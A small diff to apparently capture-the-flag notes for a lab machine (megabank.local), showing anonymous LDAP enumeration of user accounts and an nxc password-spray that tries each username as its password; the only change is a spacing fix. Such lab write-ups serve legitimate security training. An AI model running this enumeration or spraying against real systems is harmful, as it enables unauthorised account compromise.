@@ -2,7 +2,7 @@ ldap search to find users
 ```bash
 ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" > ldap.info
 
-cat ldap.info| grep 'objectClass: user' -A30 | grep -i samaccountname
+cat ldap.info | grep 'objectClass: user' -A30 | grep -i samaccountname
 
 nxc ldap megabank.local -u users.txt -p users.txt --log nxc.log --no-brute --continue-on-success
 
